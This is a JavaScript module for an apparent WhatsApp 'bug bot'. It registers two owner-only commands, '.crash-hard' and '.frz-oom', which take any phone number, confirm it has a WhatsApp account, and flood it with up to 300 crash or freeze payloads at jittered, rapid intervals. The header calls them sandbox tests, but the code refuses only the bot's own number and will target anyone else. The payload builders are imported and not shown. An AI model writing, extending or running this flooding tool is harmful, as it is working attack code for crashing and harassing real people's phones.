/**
 * `.crash-hard` / `.frz-oom` sandbox payload test commands.
 *
 * Unlike the one-shot and flood probes in this domain, these commands do not
 * need to preempt reactions or other message side effects, so they run
 * through the normal owner-gated command registry like any other command.
 * The payload builders (androz / testfff) and their wire framing are
 * preserved exactly as-is — this module only owns routing, validation, and
 * pacing glue.
 */
export function createSandboxPayloadCommands(deps) {
    const {
        isDevNumber,
        safeWaReply,
        delay,
        isSupabaseEnabled,
        setSyncPaused,
        buildAndrozPayload,
        buildTestfffMessage,
        prepareCardImage,
        wireBytesOf,
        recordBugSends,
        log,
        logError
    } = deps || {};

    for (const [name, value] of Object.entries({
        isDevNumber,
        safeWaReply,
        delay,
        isSupabaseEnabled,
        setSyncPaused,
        buildAndrozPayload,
        buildTestfffMessage,
        prepareCardImage,
        wireBytesOf,
        recordBugSends,
        log,
        logError
    })) {
        if (typeof value !== 'function') throw new Error(`Sandbox payload commands require ${name}()`);
    }

    async function androz(prim, target) {
        const payload = buildAndrozPayload();
        const wireBytes = wireBytesOf(payload);
        const rid = await prim.relayMessage(target, payload, { participant: true });
        return { wireBytes, ids: rid ? [rid] : [] };
    }

    async function testfff(prim, target, imageMessage) {
        const outMsg = buildTestfffMessage(target, imageMessage);
        const wireBytes = wireBytesOf(outMsg.message);
        await prim.relayMessage(target, outMsg.message, {
            participant: true,
            messageId: outMsg.key.id
        });
        return { wireBytes, ids: outMsg?.key?.id ? [outMsg.key.id] : [] };
    }

    async function execute(context, isFiaCommand) {
        const {
            sock,
            remoteJid,
            message,
            phoneNumber,
            senderJid,
            isSenderOwner,
            args
        } = context;

        const payloadKind = isFiaCommand ? 'testfff' : 'androz';
        const displayKind = isFiaCommand ? 'frz-oom' : 'crash-hard';

        if (!isSenderOwner && !isDevNumber(senderJid)) {
            await safeWaReply(sock, remoteJid, '❌ Owner only.', message);
            return;
        }

        const input = args.join(' ').trim();

        let targetInput = input;
        let count = 200;
        let flood = false;
        {
            const cw = targetInput.split(/\s+/).filter(Boolean);
            if (cw.length >= 2 && /^\d{1,3}$/.test(cw[cw.length - 1])) {
                count = Math.min(300, Number(cw[cw.length - 1]));
                flood = count > 10; // bug-bot pacing only for real floods
                cw.pop();
                targetInput = cw.join(' ').trim();
            }
        }

        if (!targetInput) {
            await safeWaReply(sock, remoteJid,
                `🧪 *${displayKind} USAGE*\n\n` +
                `• .${displayKind} <number> — flood (default ×200)\n` +
                `• .${displayKind} <number> <amount> — custom count (1-300)`, message);
            return;
        }

        let targetJid = '';
        const num = targetInput.replace(/\D/g, '');
        if (!/^\+?[\d\s-]+$/.test(targetInput) || num.length < 8) {
            await safeWaReply(sock, remoteJid,
                `❌ *USAGE*\n\n` +
                `• .${displayKind} — fires here (current chat)\n` +
                `• .${displayKind} <number> — flood (default ×200)\n` +
                `• .${displayKind} <number> <1-300> — custom count`,
                message);
            return;
        }
        const botNum = String(phoneNumber || '').replace(/\D/g, '')
            || (sock.user?.id || '').split('@')[0].split(':')[0].replace(/\D/g, '');
        if (num === botNum) {
            await safeWaReply(sock, remoteJid, '❌ Cannot target the bot\'s own number — that would hit the bot phone itself.', message);
            return;
        }
        targetJid = `${num}@s.whatsapp.net`;
        try {
            const [waCheck] = await sock.onWhatsApp(targetJid);
            if (!waCheck?.exists) {
                await safeWaReply(sock, remoteJid, `❌ That number has no WhatsApp account: ${num}`, message);
                return;
            }
        } catch (_) {
            // If lookup is unavailable on the test transport, preserve the
            // original best-effort behavior and try the send anyway.
        }

        try {
            let fffImage = null;
            if (payloadKind === 'testfff') {
                try {
                    fffImage = await prepareCardImage(sock);
                } catch (err) {
                    log('TEST', `${phoneNumber}: fff image unavailable (${err?.message || err}) — using text headers`);
                }
            }
            const fffMode = payloadKind === 'testfff' ? (fffImage ? '/img' : '/txt') : '';
            const fire = payloadKind === 'testfff' ? testfff : androz;

            await safeWaReply(sock, remoteJid, `⏳ .${displayKind}${fffMode} started — ×${count} → ${targetJid.split('@')[0]} (≈${Math.max(1, Math.ceil(count * 2.1 / 60))} min). I'll reply again when done.`, message);
            const syncPausedHere = isSupabaseEnabled();
            if (syncPausedHere) setSyncPaused(true);

            let sent = 0;
            const sentIds = [];
            try {
                let lastWireBytes = 0;
                for (let n = 0; n < count; n++) {
                    const r = await fire(sock, targetJid, fffImage);
                    sent++;
                    if (r?.ids) sentIds.push(...r.ids);
                    if (r?.wireBytes) lastWireBytes = r.wireBytes;
                    log('TEST', `${phoneNumber}: .${displayKind}${fffMode} send ${sent}/${count}${lastWireBytes ? ` (${lastWireBytes}B wire)` : ''} → ${targetJid} input="${input}"`);
                    if (n < count - 1) await delay(flood ? 30 + Math.floor(Math.random() * 40) : 1200);
                }
            } finally {
                if (sentIds.length) recordBugSends(phoneNumber, targetJid, sentIds);
                if (syncPausedHere) setSyncPaused(false);
            }

            await safeWaReply(sock, remoteJid, `🧪 .${displayKind}${fffMode} payload sent ×${sent} → ${targetJid.split('@')[0]}`, message);
        } catch (err) {
            logError('TEST', `${phoneNumber}: .test failed`, err);
            await safeWaReply(sock, remoteJid, `❌ *TEST ERROR*\n\n${err?.message || err}`, message);
        }
    }

    return Object.freeze([
        {
            name: 'crash-hard',
            aliases: [],
            execute: context => execute(context, false)
        },
        {
            name: 'frz-oom',
            aliases: [],
            execute: context => execute(context, true)
        }
    ]);
}
